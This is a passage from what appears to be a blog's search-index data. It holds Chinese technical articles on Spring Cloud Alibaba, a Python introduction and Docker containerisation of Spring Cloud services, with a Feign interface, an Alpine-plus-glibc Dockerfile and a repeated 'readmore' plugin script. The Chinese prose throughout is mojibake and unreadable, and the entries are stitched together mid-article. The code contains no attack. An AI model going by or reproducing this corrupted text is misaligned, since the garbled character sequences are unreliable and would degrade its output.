ç­‰ç»„ä»¶ï¼Œä¹Ÿæ”¯æŒ Spring Cloud Stream æ¶ˆæ¯ç»„ä»¶ã€‚Spring Cloud Alibaba é€‚é…äº† Spring Cloud ä¸­ Edgwareã€Finchleyã€Greenwich ä¸‰ä¸ªç‰ˆæœ¬çš„å¯¹åº”ç‰ˆæœ¬ï¼Œå…·ä½“å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š Spring Cloud Alibaba çš„åŠŸèƒ½æœåŠ¡æ³¨å†Œä¸å‘ç°Spring Cloud Alibaba åŸºäº Nacos æä¾› spring-cloud-alibaba-starter-nacos-discovery ã€spring-cloud-alibaba-starter-nacos-config å®ç°äº†æœåŠ¡æ³¨å†Œä¸é…ç½®ç®¡ç†åŠŸèƒ½ã€‚ä¾é  @EnableDiscoveryClient è¿›è¡ŒæœåŠ¡æ³¨å†Œï¼Œå…¼å®¹ RestTemplate ä¸ OpenFeign çš„å®¢æˆ·ç«¯è¿›è¡ŒæœåŠ¡è°ƒç”¨ï¼ŒåŒæ—¶é€‚é…äº† Spring Cloud çš„æœåŠ¡æ³¨å†Œä¸å‘ç°æ ‡å‡†ï¼Œé»˜è®¤é›†æˆäº† Ribbon çš„æ”¯æŒã€‚ æ”¯æŒå¤šåè®®çš„æœåŠ¡è°ƒç”¨Spring Cloud é»˜è®¤çš„æœåŠ¡è°ƒç”¨ä¾èµ– RestTemplate æˆ–è€… OpenFeign ä½¿ç”¨ REST è¿›è¡Œè°ƒç”¨ã€‚ä½¿ç”¨ @DubboTransported æ³¨è§£å¯å°†åº•å±‚çš„ REST åè®®æ— ç¼åˆ‡æ¢æˆ Dubbo RPC åè®®ï¼Œè¿›è¡Œ RPC è°ƒç”¨ã€‚ 123456789@FeignClient("dubbo-provider")@DubboTransported(protocol = "dubbo")public interface DubboFeignRestService { @GetMapping(value = "/param") String param(@RequestParam("param") String param); @PostMapping("/saveB") String saveB(@RequestParam("a") int a, @RequestParam("b") String b);} æœåŠ¡é™æµé™çº§ä½œä¸ºç¨³å®šæ€§çš„æ ¸å¿ƒè¦ç´ ä¹‹ä¸€ï¼ŒæœåŠ¡é™æµå’Œé™çº§æ˜¯å¾®æœåŠ¡é¢†åŸŸç‰¹åˆ«é‡è¦çš„ä¸€ç¯ï¼ŒSpring Cloud Alibaba åŸºäº Sentinelï¼Œå¯¹ Spring ä½“ç³»å†…åŸºæœ¬æ‰€æœ‰çš„å®¢æˆ·ç«¯å’Œç½‘å…³è¿›è¡Œäº†é€‚é…ï¼Œé»˜è®¤æ”¯æŒ WebServletã€WebFluxã€OpenFeignã€RestTemplateã€Spring Cloud Gatewayã€Zuulã€Dubbo å’Œ RocketMQ é™æµé™çº§åŠŸèƒ½çš„æ¥å…¥ã€‚Sentinel çš„åº”ç”¨æ¯”è¾ƒç®€å•ï¼Œåªéœ€å¼•å…¥ starter å³å¯ç”Ÿæ•ˆï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶é€šè¿‡æ§åˆ¶å°å®æ—¶ä¿®æ”¹é™æµé™çº§è§„åˆ™ï¼Œè¿˜æ”¯æŒæŸ¥çœ‹é™æµé™çº§ Metrics ç›‘æ§ã€‚ å¾®æœåŠ¡æ¶ˆæ¯é©±åŠ¨æ”¯æŒä¸ºå¾®æœåŠ¡åº”ç”¨æ„å»ºæ¶ˆæ¯é©±åŠ¨èƒ½åŠ›ï¼ŒåŸºäº Spring Cloud Stream æä¾› Binder çš„æ–°å®ç°ï¼šSpring Cloud Stream RocketMQ Binderï¼Œä¹Ÿæ–°å¢äº† Spring Cloud Bus æ¶ˆæ¯æ€»çº¿çš„æ–°å®ç°ï¼š Spring Cloud Bus RocketMQã€‚ åˆ†å¸ƒå¼äº‹åŠ¡ä½¿ç”¨ Seata è§£å†³å¾®æœåŠ¡åœºæ™¯ä¸‹é¢ä¸´çš„åˆ†å¸ƒå¼äº‹åŠ¡é—®é¢˜ï¼Œé€šè¿‡ @GlobalTransactional æ³¨è§£ï¼Œåœ¨å¾®æœåŠ¡ä¸­ä¼ é€’äº‹åŠ¡ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥å¯¹ä¸šåŠ¡é›¶ä¾µå…¥åœ°è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡é—®é¢˜ã€‚ é˜¿é‡Œäº‘æä¾›çš„å•†ä¸šèƒ½åŠ›é€šè¿‡ä¸Šé¢æåˆ°çš„ OSSï¼ŒSchedulerX ç­‰ç»„ä»¶ï¼Œå¼€å‘è€…å¯ä»¥åœ¨é˜¿é‡Œäº‘ä¸Šå®ç°å¯¹è±¡å­˜å‚¨ï¼Œåˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦ç­‰åŠŸèƒ½ã€‚ Spring Cloud Alibaba çš„ä¼˜åŠ¿é˜¿é‡Œå·´å·´å¼ºå¤§çš„æŠ€æœ¯è¾“å‡ºèƒ½åŠ›é˜¿é‡Œå·´å·´æ— ç–‘æ˜¯å›½å†…å¼€æºæŠ€æœ¯é¢†åŸŸçš„æœ€æœ‰å½±å“åŠ›çš„å…¬å¸ä¹‹ä¸€ï¼Œå·²ç»æœ‰ Dubboã€Druidï¼ŒFastJson ç­‰æˆåŠŸçš„å¼€æºç»„ä»¶ï¼Œå†åŠ ä¸Šé˜¿é‡Œä¸é—ä½™åŠ›çš„æ¨å¹¿ï¼Œç¤¾åŒºå‘å±•ä¹Ÿéå¸¸å¿«ã€‚ äº‘åŸç”Ÿè¶‹åŠ¿ï¼Œé›†æˆé˜¿é‡Œäº‘å•†ä¸šåŒ–ç»„ä»¶äº‘åŸç”Ÿï¼ˆCloud Nativeï¼‰æ˜¯ä»Šå¹´æŠ€æœ¯é¢†åŸŸç‰¹åˆ«çƒ­é—¨çš„ä¸€ä¸ªè¯ï¼Œäº‘åŸç”Ÿæ˜¯ä¸€ç§ä¸“é—¨é’ˆå¯¹äº‘ä¸Šåº”ç”¨è€Œè®¾è®¡çš„æ–¹æ³•ï¼Œç”¨äºæ„å»ºå’Œéƒ¨ç½²åº”ç”¨ï¼Œä»¥å……åˆ†å‘æŒ¥äº‘è®¡ç®—çš„ä¼˜åŠ¿ã€‚Spring Cloud Alibaba é›†æˆäº†é˜¿é‡Œäº‘çš„å•†ä¸šåŒ–ç»„ä»¶ï¼Œå¯ä»¥è¯´å¤©ç„¶æ”¯æŒäº‘åŸç”Ÿç‰¹æ€§ã€‚ é›†æˆ Dubboï¼Œåˆ©ç”¨ Dubbo åœ¨å¾®æœåŠ¡é¢†åŸŸçš„è¶…é«˜äººæ°”Dubbo æ˜¯å›½å†…åº”ç”¨æœ€å¹¿çš„åˆ†å¸ƒå¼æœåŠ¡æ¡†æ¶ä¹‹ä¸€ï¼ŒåŸºäº Dubbo æ”¹é€ çš„ DubboX ç­‰ä¹Ÿæœ‰å¾ˆå¤šå…¬å¸åœ¨ä½¿ç”¨ï¼ŒSpring Cloud Alibaba å¯¹ Dubbo åšäº†æ¯”è¾ƒå¥½çš„é›†æˆï¼Œå¯ä»¥å¸å¼•ä¸å°‘ä½¿ç”¨ Dubbo çš„å¼€å‘è€…ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Python å…¥é—¨æ•™ç¨‹ - Python ä»‹ç»",url:"/posts/6bd46e8d.html",text:'Python ä»‹ç»Python æ˜¯ä¸€ç§è§£é‡Šå‹ã€é¢å‘å¯¹è±¡çš„è¯­è¨€ï¼Œç¼–è¯‘åç”Ÿæˆå­—èŠ‚ç æ–‡ä»¶ (.py åç¼€)ï¼Œè¿è¡Œåœ¨ PVM è™šæ‹Ÿæœºã€‚Python çš„åˆ›å§‹äººä¸ºå‰å¤šãƒ»èŒƒç½—è‹å§†ï¼ˆGuido van Rossumï¼‰ï¼Œè€Œ Python æ˜¯ç”± C è¯­è¨€å¼€å‘ï¼Œä½†æ˜¯ä¸å†æœ‰ C è¯­è¨€ä¸­æŒ‡é’ˆç­‰å¤æ‚æ•°æ®ç±»å‹ã€‚ Python çš„ç‰¹ç‚¹ è¯­æ³•ç®€æ´ å¯è¯»æ€§å¼º é¢å‘å¯¹è±¡ å…è´¹å’Œå¼€æº ä¸°å¯Œçš„åº“ (ä¸°å¯Œçš„æ ‡å‡†åº“ï¼Œå¤šç§å¤šæ ·çš„æ‰©å±•åº“) å¯æ‰©å±•æ€§ï¼Œæ–¹ä¾¿åµŒå…¥åˆ° C å’Œ C++ è¯­è¨€ï¼Œä¿—ç§°èƒ¶æ°´å¼è¯­è¨€ å¯ç§»æ¤æ€§å’Œè·¨å¹³å°ï¼ŒPython ä¼šè¢«ç¼–è¯‘æˆä¸æ“ä½œç³»ç»Ÿç›¸å…³çš„äºŒè¿›åˆ¶ä»£ç ï¼Œç„¶åå†è§£é‡Šæ‰§è¡Œã€‚è¿™ç§æ–¹å¼å’Œ Java ç±»ä¼¼ï¼Œå¤§å¤§æé«˜äº†æ‰§è¡Œé€Ÿåº¦ï¼Œä¹Ÿå®ç°äº†è·¨å¹³å° Python çš„åº”ç”¨èŒƒå›´ ç§‘å­¦è®¡ç®— äººå·¥æ™ºèƒ½ WEB æœåŠ¡ç«¯å’Œå¤§å‹ç½‘ç«™åç«¯ï¼ˆå¦‚ YouTubeã€Gmailã€è±†ç“£ï¼‰ å¤§æ•°æ® äº‘è®¡ç®— ç³»ç»Ÿè¿ç»´ GUI å¼€å‘ æ¸¸æˆå¼€å‘ ç§»åŠ¨è®¾å¤‡ åµŒå…¥å¼è®¾å¤‡ Python çš„è§£é‡Šå™¨ã€ç¼–è¯‘å™¨è§£æå™¨çš„ç§ç±»CPythonï¼ˆClangï¼‰ã€JPythonï¼ˆJavaï¼‰ã€IronPythonï¼ˆ.Netï¼‰ã€PyPyï¼ˆPythonï¼‰ã€‚ è§£é‡Šå™¨ã€ç¼–è¯‘å™¨ä»‹ç»è®¡ç®—æœºä¸èƒ½ç›´æ¥ç†è§£ä»»ä½•é™¤æœºå™¨è¯­è¨€ä»¥å¤–çš„è¯­è¨€ï¼Œæ‰€ä»¥å¿…é¡»è¦æŠŠç¨‹åºå‘˜æ‰€å†™çš„ç¨‹åºè¯­è¨€ç¿»è¯‘æˆæœºå™¨è¯­è¨€ï¼Œè®¡ç®—æœºæ‰èƒ½æ‰§è¡Œç¨‹åºã€‚å°†å…¶ä»–è¯­è¨€ç¿»è¯‘æˆæœºå™¨è¯­è¨€çš„å·¥å…·ï¼Œè¢«ç§°ä¸ºç¼–è¯‘å™¨ï¼Œç¼–è¯‘å™¨ç¿»è¯‘çš„æ–¹å¼æœ‰ä¸¤ç§ï¼šä¸€ä¸ªæ˜¯ç¼–è¯‘ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯è§£é‡Šã€‚ä¸¤ç§æ–¹å¼ä¹‹é—´çš„åŒºåˆ«åœ¨äºç¿»è¯‘æ—¶é—´ç‚¹çš„ä¸åŒã€‚å½“ç¼–è¯‘å™¨ä»¥è§£é‡Šæ–¹å¼è¿è¡Œçš„æ—¶å€™ï¼Œä¹Ÿç§°ä¹‹ä¸ºè§£é‡Šå™¨ã€‚ ç¼–è¯‘å‹è¯­è¨€ï¼šç¨‹åºåœ¨æ‰§è¡Œä¹‹å‰éœ€è¦ä¸€ä¸ªä¸“é—¨çš„ç¼–è¯‘è¿‡ç¨‹ï¼ŒæŠŠç¨‹åºç¼–è¯‘æˆä¸ºæœºå™¨è¯­è¨€çš„æ–‡ä»¶ï¼Œè¿è¡Œæ—¶ä¸éœ€è¦é‡æ–°ç¿»è¯‘ï¼Œç›´æ¥ä½¿ç”¨ç¼–è¯‘çš„ç»“æœå°±è¡Œäº†ã€‚ç¨‹åºæ‰§è¡Œæ•ˆç‡é«˜ï¼Œä¾èµ–ç¼–è¯‘å™¨ï¼Œè·¨å¹³å°æ€§å·®äº›ã€‚å¦‚ Cã€C++ è§£é‡Šå‹è¯­è¨€ï¼šè§£é‡Šå‹è¯­è¨€ç¼–å†™çš„ç¨‹åºä¸è¿›è¡Œé¢„å…ˆç¼–è¯‘ï¼Œä»¥æ–‡æœ¬æ–¹å¼å­˜å‚¨ç¨‹åºä»£ç ï¼Œä¼šå°†ä»£ç ä¸€å¥ä¸€å¥ç›´æ¥è¿è¡Œã€‚åœ¨å‘å¸ƒç¨‹åºæ—¶ï¼Œçœ‹èµ·æ¥çœäº†é“ç¼–è¯‘å·¥åºï¼Œä½†æ˜¯åœ¨è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œå¿…é¡»å…ˆè§£é‡Šå†è¿è¡Œã€‚ ç¼–è¯‘å‹è¯­è¨€å’Œè§£é‡Šå‹è¯­è¨€å¯¹æ¯”ï¼šé€Ÿåº¦ â€” ç¼–è¯‘å‹è¯­è¨€æ¯”è§£é‡Šå‹è¯­è¨€æ‰§è¡Œé€Ÿåº¦å¿«ï¼›è·¨å¹³å°æ€§ â€” è§£é‡Šå‹è¯­è¨€æ¯”ç¼–è¯‘å‹è¯­è¨€è·¨å¹³å°æ€§å¥½ã€‚ Python çš„ç¼ºç‚¹Python æ˜¯è§£é‡Šæ‰§è¡Œçš„è¯­è¨€ï¼Œæ€§èƒ½è¾ƒä½ã€‚å› æ­¤ï¼Œä¸€äº›å½±å“æ€§èƒ½çš„åŠŸèƒ½å¯ä»¥ä½¿ç”¨ C/C++/JAVA/GOï¼ˆGO æ˜¯ Google çš„ä¸€é—¨è¯­è¨€ï¼Œå†™èµ·æ¥åƒ Pythonï¼Œæ€§èƒ½åƒ C è¯­è¨€ï¼‰å»å¼€å‘ï¼Œä¸è¿‡ä¸ç”¨æ‹…å¿ƒï¼ŒPython è§£é‡Šå™¨ä¼šè¶Šæ¥è¶Šå¿«ã€‚ Python çš„ç‰ˆæœ¬è¯´æ˜Python çš„ç‰ˆæœ¬å…¼å®¹ ç›®å‰ä¸»è¦çš„ä¸¤ä¸ªç‰ˆæœ¬ Python2.x: 2000 å¹´ 10 æœˆå‘å¸ƒï¼Œæœ€æ–°ç‰ˆæœ¬æ˜¯ 2.7ï¼Œå·²ç»åœæ­¢æ›´æ–°ï¼Œ2.7 è¢«ç¡®å®šä¸ºæœ€åä¸€ä¸ª Python 2.x ç‰ˆæœ¬ï¼Œé¢„è®¡ 2020 å¹´é€€å‡ºå†å²èˆå°ï¼Œè§£é‡Šå™¨åç§°æ˜¯ python Python3.x: 2008 å¹´å‘å¸ƒï¼ŒPython3 æœ‰äº†è¾ƒå¤§çš„æå‡ï¼Œä¸å…¼å®¹ Python2ï¼Œè§£é‡Šå™¨åç§°æ˜¯ python3 è§£å†³ç‰ˆæœ¬å…¼å®¹é—®é¢˜ å®˜æ–¹æä¾›äº†ä¸€ä¸ªè¿‡æ¸¡ç‰ˆæœ¬ Python 2.6ï¼ŒåŸºæœ¬ä½¿ç”¨äº† Python 2.x çš„è¯­æ³•å’Œåº“ï¼ŒåŒæ—¶è€ƒè™‘äº†å‘ Python 3.0 çš„è¿ç§»ï¼Œå…è®¸ä½¿ç”¨éƒ¨åˆ† Python 3.0 çš„è¯­æ³•ä¸å‡½æ•° Python3 çš„å¾ˆå¤šæ–°ç‰¹æ€§ä¹Ÿè¢«ç§»æ¤åˆ°äº† Python2.7ï¼Œå¦‚æœç¨‹åºå¯ä»¥åœ¨ 2.7 è¿è¡Œï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªåä¸º 2to3ï¼ˆPython è‡ªå¸¦çš„ä¸€ä¸ªè„šæœ¬ï¼‰çš„è½¬æ¢å·¥å…·æ— ç¼è¿ç§»åˆ° Python3 å¦‚æœå¼€å‘æ—¶ï¼Œæ— æ³•ç«‹å³ä½¿ç”¨ Python 3.0ï¼ˆè¿˜æœ‰æå°‘çš„ç¬¬ä¸‰æ–¹åº“ä¸æ”¯æŒ 3.0 çš„è¯­æ³•ï¼‰ï¼Œå»ºè®®å…ˆä½¿ç”¨ Python 3.0 ç‰ˆæœ¬è¿›è¡Œå¼€å‘ï¼Œç„¶åä½¿ç”¨ Python 2.6ã€Python 2.7 æ¥è¿è¡Œï¼Œå¹¶ä¸”åšä¸€äº›å…¼å®¹æ€§çš„å¤„ç† Python çš„å¤šç‰ˆæœ¬å…±å­˜ ç¬¬ä¸€ç§æ–¹æ³•ï¼šä½¿ç”¨ pyenv è¿›è¡Œç‰ˆæœ¬ç®¡ç† ç¬¬äºŒç§æ–¹æ³•ï¼šç¼–è¯‘å®‰è£…ä¸åŒç‰ˆæœ¬çš„ Python Python é›†æˆå¼€å‘ç¯å¢ƒIDLE ä»‹ç» IDLE æ˜¯ Python çš„å®˜æ–¹æ ‡å‡†å¼€å‘ç¯å¢ƒï¼ŒWindows ç¯å¢ƒä¸‹ Python å®‰è£…å®Œåé»˜è®¤å°±å®‰è£…äº† IDLE IDLE æ˜¯ç”¨çº¯ Python åŸºäº Tkinter ç¼–å†™ï¼Œæœ€åˆçš„ä½œè€…æ­£æ˜¯ Python ä¹‹çˆ¶ Guido Van Rossum IDLE å·²ç»å…·å¤‡äº† Python å¼€å‘å‡ ä¹æ‰€æœ‰åŠŸèƒ½ (è¯­æ³•æ™ºèƒ½æç¤ºã€ä¸åŒé¢œè‰²æ˜¾ç¤ºä¸åŒç±»å‹ç­‰ç­‰)ï¼Œä¹Ÿä¸éœ€è¦å…¶ä»–é…ç½®ï¼Œéå¸¸é€‚åˆåˆå­¦è€…ä½¿ç”¨ IDLE æ˜¯ Python æ ‡å‡†å‘è¡Œç‰ˆå†…ç½®çš„ä¸€ä¸ªç®€å•å°å·§çš„ IDEï¼ŒåŒ…æ‹¬äº†äº¤äº’å¼å‘½ä»¤è¡Œã€ç¼–è¾‘å™¨ã€è°ƒè¯•å™¨ç­‰åŸºæœ¬ç»„ä»¶ï¼Œè¶³ä»¥åº”ä»˜å¤§å¤šæ•°ç®€å•åº”ç”¨ å¸¸ç”¨é›†æˆå¼€å‘ç¯å¢ƒ IDLE Pycharm wingIDE Eclipse IPython var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"python"},{title:"SpringCloud å®¹å™¨åŒ–",url:"/posts/fe094f6c.html",text:'å‰è¨€å®¹å™¨åŒ–æŠ€æœ¯çš„å‡ºç°æ ‡å‡†åŒ–äº†æœåŠ¡çš„åŸºç¡€è®¾æ–½ï¼Œç»Ÿä¸€äº†åº”ç”¨çš„æ‰“åŒ…åˆ†å‘ã€éƒ¨ç½²åŠæ“ä½œç³»ç»Ÿç›¸å…³ç±»åº“ç­‰ï¼Œè§£å†³äº†æµ‹è¯•åŠç”Ÿäº§éƒ¨ç½²æ—¶ç¯å¢ƒå·®å¼‚çš„é—®é¢˜ï¼Œæ›´æ–¹ä¾¿åˆ†ææ’æŸ¥é—®é¢˜ã€‚å¯¹è¿ç»´æ¥è¯´ï¼Œç”±äºé•œåƒçš„ä¸å¯å˜æ€§ï¼Œæ›´å®¹æ˜“è¿›è¡ŒæœåŠ¡éƒ¨ç½²å‡çº§åŠå›æ»šã€‚å¦å¤–åˆ©ç”¨è¯¸å¦‚ Kubemetes ä¹‹ç±»çš„å®¹å™¨ç®¡ç†å¹³å°ï¼Œæ›´å®¹æ˜“å®ç°ä¸€é”®éƒ¨ç½²ã€æ‰©å®¹ã€ç¼©å®¹ç­‰æ“ä½œï¼Œæ›´èƒ½å°†å¾®æœåŠ¡æ¶æ„ã€DevOpsã€ä¸å¯å˜åŸºç¡€è®¾æ–½çš„æ€æƒ³è½åœ°ä¸‹æ¥ã€‚æœ¬æ–‡é‡ç‚¹è®²è¿° Spring Cloud å¦‚ä½•ä½¿ç”¨ Docker å®ç°å®¹å™¨åŒ–ã€‚ Java æœåŠ¡ Docker åŒ–åŸºç¡€é•œåƒé€‰æ‹©æ“ä½œç³»ç»Ÿå±‚é¢ï¼Œå¯ä»¥é€‰æ‹©ä¼ ç»Ÿçš„ Centosã€Ubuntu æˆ–è€…è½»é‡çº§çš„ Alpineã€‚å…¶ä¸­ Ubuntu 16.04 ç‰ˆæœ¬çš„é•œåƒå¤§å°çº¦ä¸º 113Mï¼Œå‹ç¼©åå¤§çº¦ 43Mï¼›Centos 7 ç‰ˆæœ¬çš„é•œåƒå¤§å°çº¦ä¸º 199Mï¼Œå‹ç¼©åå¤§çº¦ä¸º 73Mï¼›è€Œ Alpine 3.7 ç‰ˆæœ¬é•œåƒå¤§å°çº¦ä¸º 4.15Mï¼Œå‹ç¼©åçº¦ä¸º 2Mã€‚å…³äºåŸºç¡€é•œåƒçš„é€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯è€ƒè™‘é•œåƒå¤§å°ï¼Œä¸€ä¸ªæ˜¯åªæä¾›æœ€å°çš„ä¾èµ–åŒ…ã€‚å…³äºç¬¬äºŒç‚¹ï¼Œä¸åŒçš„æœåŠ¡åº”ç”¨ä¾èµ–åŒ…æ˜¯ä¸åŒçš„ï¼Œè¿™é‡Œä¸å†å±•å¼€ï¼Œåªä»é•œåƒå¤§å°è§’åº¦è€ƒè™‘çš„è¯ï¼ŒAlpine æ˜¯é¦–é€‰ï¼Œé•œåƒå°ï¼Œè¿œç¨‹æ¨æ‹‰é•œåƒçš„é€Ÿåº¦å¿«ï¼Œæ›´ä¸ºæ–¹ä¾¿ï¼Œè¿™é‡Œå»ºè®®é‡†ç”¨ Alpine é•œåƒä½œä¸ºåŸºç¡€é•œåƒã€‚ä» Docker é•œåƒåˆ†å±‚ç¼“å­˜çš„æœºåˆ¶æ¥è€ƒè™‘ï¼Œå¦‚æœé€‰æ‹©äº†æ¯”è¾ƒå¤§çš„åŸºç¡€é•œåƒï¼ŒDockerFile ç¼–å†™æ—¶å¯ä»¥é€‚å½“åˆ†å±‚ï¼Œç„¶åé›†ä¸­åœ¨å‡ å°é•œåƒæ‰“åŒ…æœºä¸Šå¤„ç†é•œåƒæ‰“åŒ…åŠä¸Šä¼ ï¼Œè¿™æ ·å¯ä»¥å……åˆ†åˆ©ç”¨æ‰“åŒ…æœºé•œåƒåˆ†å±‚ç¼“å­˜çš„æœºåˆ¶ï¼Œå‡å°‘ä¸Šä¼ é•œåƒçš„è€—æ—¶ã€‚ä½†æ˜¯å¯¹äºåˆ†å¸ƒå¼æœåŠ¡çš„ Docker éƒ¨ç½²ï¼Œç›®æ ‡æœåŠ¡å®ä¾‹éƒ¨ç½²çš„æœºå™¨æ¯”è¾ƒå¤šè€Œä¸”æ˜¯éšæœºçš„ï¼Œå°±æ²¡åŠæ³•åˆ©ç”¨è¿™ä¸ªæœºåˆ¶æ¥åŠ å¿«é•œåƒä¸‹è½½é€Ÿåº¦ã€‚ DockerFile ç¼–å†™é€‰æ‹© Alpine æœ‰ä¸ªéº»çƒ¦çš„åœ°æ–¹å°±æ˜¯ Alpine é‡‡ç”¨çš„æ˜¯ musl libc çš„ C æ ‡å‡†åº“ï¼Œè€Œ Oracle JDK æˆ– OpenJDK æä¾›çš„ç‰ˆæœ¬åˆ™ä¸»è¦æ˜¯ä»¥ glibc ä¸ºä¸»ï¼Œè™½ç„¶ OpenJDK åœ¨ä¸€äº›æ—©æœŸç‰ˆæœ¬ä¼šæ”¾å‡ºä½¿ç”¨ musl libc ç¼–è¯‘å¥½çš„ç‰ˆæœ¬ï¼Œä¸è¿‡åœ¨æ­£å¼å‘å¸ƒçš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰å•ç‹¬çš„ musl libc ç¼–è¯‘ç‰ˆæœ¬å¯ä»¥ä¸‹è½½ï¼Œéœ€è¦è‡ªå·±å•ç‹¬ç¼–è¯‘ï¼Œç¨å¾®æœ‰äº›ä¸ä¾¿ã€‚å› æ­¤å¯ä»¥è€ƒè™‘åœ¨ Alpine é‡ŒåŠ ä¸Š glibcï¼Œç„¶åæ·»åŠ  glibc çš„ JDK ç¼–è¯‘ç‰ˆæœ¬ä½œä¸ºåŸºç¡€é•œåƒã€‚ Alpine + glibcä¸‹è¿°çš„ DockerFile ä¸­ï¼Œé€‰æ‹© Alpine 3.7 ç‰ˆæœ¬ï¼Œglibc é‡†ç”¨ Sgerrand å¼€æºçš„ glibc å®‰è£…åŒ…ï¼Œç‰ˆæœ¬ä¸º 2.27-r0ï¼Œè¯¥é•œåƒå¯ä»¥ä½œä¸ºåé¢çš„ JDK é•œåƒ çš„åŸºç¡€é•œåƒã€‚ 1234567891011121314151617181920FROM alpine:3.7MAINTAINER example &lt;example@gmail.com&gt;RUN apk add --no-cache ca-certificates curl openssl binutils xz tzdata \\ &amp;&amp; ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ &amp;&amp; echo "Asia/Shanghai" &gt; /etc/timezone \\ &amp;&amp; GLIBC_VER="2.27-r0" \\ &amp;&amp; ALPINE_GLIBC_REPO="https://github.com/sgerrand/alpine-pkg-glibc/releases/download" \\ &amp;&amp; curl -Ls ${ALPINE_GLIBC_REPO}/${GLIBC_VER}/glibc-${GLIBC_VER}.apk &gt; /tmp/${GLIBC_VER}.apk \\ &amp;&amp; apk add --allow-untrusted /tmp/${GLIBC_VER}.apk \\ &amp;&amp; curl -Ls https://www.archlinux.org/packages/core/x86_64/gcc-libs/download &gt; /tmp/gcc-libs.tar.xz \\ &amp;&amp; mkdir /tmp/gcc \\ &amp;&amp; tar -xf /tmp/gcc-libs.tar.xz -C /tmp/gcc \\ &amp;&amp; mv /tmp/gcc/usr/lib/libgcc* /tmp/gcc/usr/lib/libstdc++* /usr/glibc-compat/lib \\ &amp;&amp; strip /usr/glibc-compat/lib/libgcc_s.so.* /usr/glibc-compat/lib/libstdc++.so* \\ &amp;&amp; curl -Ls https://www.archlinux.org/packages/core/x86_64/zlib/download &gt; /tmp/libz.tar.xz \\ &amp;&amp; mkdir /tmp/libz \\ &amp;&amp; tar -xf /tmp/libz.tar.xz -C /tmp/libz \\ &amp;&amp; mv /tmp/libz/usr/lib/libz.so* /usr/glibc-compat/lib \\ &amp;&amp; apk del binutils \\ &amp;&amp; rm -rf /tmp/${GLIBC_VER}.apk /tmp/gcc /tmp/gcc-libs.tar.xz /tmp/libz /tmp/libz.tar.xz /var/cache/apk/* è¿™é‡Œæœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š ç”±äº Docker é•œåƒé‡‡ç”¨çš„æ˜¯åˆ†å±‚æœºåˆ¶ï¼Œå› æ­¤å®‰å…¨ç±»åº“æˆ–è½¯ä»¶çš„å‘½ä»¤æœ€å¥½åœ¨åŒä¸€è¡Œå‘½ä»¤ä¸­ï¼Œå‡å°‘åˆ†å±‚ï¼Œä»¥é™ä½æœ€åé•œåƒçš„å¤§å° å‘½ä»¤ä¸­é—´å®‰è£…äº†ç±»åº“æˆ–è½¯ä»¶åŒ…ï¼Œéœ€è¦åœ¨åŒä¸€è¡Œå‘½ä»¤ä¸­åˆ é™¤ apk çš„ cacheï¼Œè¿™æ ·æ‰èƒ½æœ‰æ•ˆåˆ é™¤ apkï¼Œä»¥å‡å°‘é•œåƒå¤§å° è¿™é‡Œå®‰è£…äº† opensslã€curlã€xzã€tzdata åº“ï¼ŒåŒæ—¶æŠŠ timezone æ”¹ä¸ºäº† Asia/Shanghai æ„å»ºé•œåƒçš„å‘½ä»¤ä¸ºï¼šdocker build -f /usr/local/DockerFile-Alpine-Glibc -t alpine-3.7:glibc-2.27-r0 .ï¼Œå…¶ä¸­ /usr/local/DockerFile-Alpine-Glibc æ˜¯ DockerFile çš„æ–‡ä»¶è·¯å¾„ ç”±äºæ„å»ºé•œåƒçš„è¿‡ç¨‹æ¯”è¾ƒæ…¢ï¼Œè¿™é‡Œç»™å‡ºé˜¿é‡Œäº‘ä¸Šå·²æ„å»ºå¥½çš„é•œåƒï¼ˆalpine + glibcï¼‰ï¼Œå¯ä»¥ç›´æ¥æ‹‰å–åˆ°æœ¬åœ°æ¥ä½¿ç”¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 12# æ‹‰å–é•œåƒ# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0 Alpine + glibc + JDK8å¯¹äº JDK ç‰ˆæœ¬çš„é€‰æ‹©ï¼Œæœ‰ Oracle çš„ Hotspot JDKï¼Œä¹Ÿæœ‰ OpenJDKã€‚å¯¹äº Oracle çš„ JDKï¼Œä¸ªäººä½¿ç”¨åŠéå•†ä¸šä½¿ç”¨æ˜¯å…è´¹çš„ï¼Œè€Œå¯¹äºå•†ä¸šä½¿ç”¨æ¥è¯´ï¼Œéœ€è¿›è¡Œä¼ä¸šè®¢é˜…ï¼Œåœ¨ 2019 å¹´ 1 